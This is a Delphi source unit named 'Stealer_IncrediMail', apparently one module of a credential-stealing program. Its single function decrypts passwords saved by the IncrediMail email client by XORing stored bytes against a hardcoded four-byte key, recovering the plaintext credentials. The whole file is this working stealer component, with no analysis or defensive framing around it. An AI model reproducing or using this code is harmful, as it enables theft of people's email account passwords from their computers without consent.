unit Stealer_IncrediMail;

interface

uses
  Sysutils,Windows;

function IncrediMail_Decrypt(hmem, pwdlen:DWORD): string;

implementation

function IncrediMail_Decrypt(hmem, pwdlen:DWORD): string;
var
  i: Integer;
  c: byte;
  b: byte;
const
  CTable: array[0..3] of Byte = ($b9, $02, $fa, $01);
begin
  result := '';
  if pwdlen<=0 then exit;
  for i := 1 to pwdlen do
  begin
    CopyMemory(@b,pointer(hmem),1);
    inc(hmem);
    c := CTable[(i-1) mod 4] xor b;
    if c<>0 then result:=result+chr(c);
  end;
end;

end.
